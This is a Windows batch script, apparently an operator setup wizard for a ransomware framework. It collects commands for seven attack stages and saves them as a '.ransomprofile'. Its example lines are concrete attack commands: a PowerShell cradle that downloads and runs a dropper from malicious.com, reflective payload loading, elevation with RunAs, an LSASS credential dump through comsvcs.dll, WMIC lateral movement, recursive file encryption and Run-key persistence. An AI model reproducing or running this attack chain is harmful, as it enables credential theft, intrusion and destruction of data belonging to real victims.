@echo off
title Final Ransomware Operator Input Wizard
color 0a
cls

REM =============================================
REM # Final Ransomware Framework - Operator Setup
REM =============================================

echo [*] ===============================
echo [*] 1. Initial Access
echo [*] ===============================
echo Example: powershell -Command "IEX(New-Object Net.WebClient).DownloadString('http://malicious.com/dropper.ps1')"
set /p initialAccess="Enter Initial Access command: "

echo.
echo [*] ===============================
echo [*] 2. Execution (Payload Load)
echo [*] ===============================
echo Example: powershell -Command "$b=[System.Convert]::FromBase64String('...');[System.Reflection.Assembly]::Load($b)"
set /p execution="Enter Execution command: "

echo.
echo [*] ===============================
echo [*] 3. Privilege Escalation
echo [*] ===============================
echo Example: powershell -Command "Start-Process powershell -Args '-ExecutionPolicy Bypass -File C:\Temp\elevate.ps1' -Verb RunAs"
set /p privEsc="Enter Privilege Escalation command: "

echo.
echo [*] ===============================
echo [*] 4. Credential Access
echo [*] ===============================
echo Example: rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Temp\lsass.dmp full
set /p credAccess="Enter Credential Access command: "

echo.
echo [*] ===============================
echo [*] 5. Lateral Movement
echo [*] ===============================
echo Example: wmic /node:targetPC process call create "powershell.exe -File \\share\payload.ps1"
set /p lateralMove="Enter Lateral Movement command: "

echo.
echo [*] ===============================
echo [*] 6. File Encryption / Impact
echo [*] ===============================
echo Example: powershell -Command "Get-ChildItem C:\Docs -Recurse | ForEach {Encrypt-File $_.FullName}"
set /p fileEnc="Enter File Encryption command/script: "

echo.
echo [*] ===============================
echo [*] 7. Persistence Mechanism
echo [*] ===============================
echo Example: powershell -Command "Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'malware' -Value 'powershell -File C:\Temp\persist.ps1'"
set /p persistence="Enter Persistence command: "

echo.
echo ==============================
echo         OPERATOR SUMMARY
echo ==============================
echo.
echo [Initial Access]:         %initialAccess%
echo [Execution]:              %execution%
echo [Privilege Escalation]:   %privEsc%
echo [Credential Access]:      %credAccess%
echo [Lateral Movement]:       %lateralMove%
echo [File Encryption]:        %fileEnc%
echo [Persistence]:            %persistence%
echo.
pause
echo.
echo [*] Would you like to save this command profile? (Y/N)
set /p saveProfile="> "
if /I "%saveProfile%"=="Y" (
    set /p profileName="Enter filename (no extension): "
    (
        echo InitialAccess=%initialAccess%
        echo Execution=%execution%
        echo PrivEsc=%privEsc%
        echo CredAccess=%credAccess%
        echo LateralMovement=%lateralMove%
        echo FileEncryption=%fileEnc%
        echo Persistence=%persistence%
    ) > "%profileName%.ransomprofile"
    echo [+] Profile saved as %profileName%.ransomprofile
) else (
    echo [-] Profile not saved.
)

echo.
echo [!] Execution of live payloads is NOT automated in this batch. Manual interaction or a sandbox environment is recommended.
pause
exit
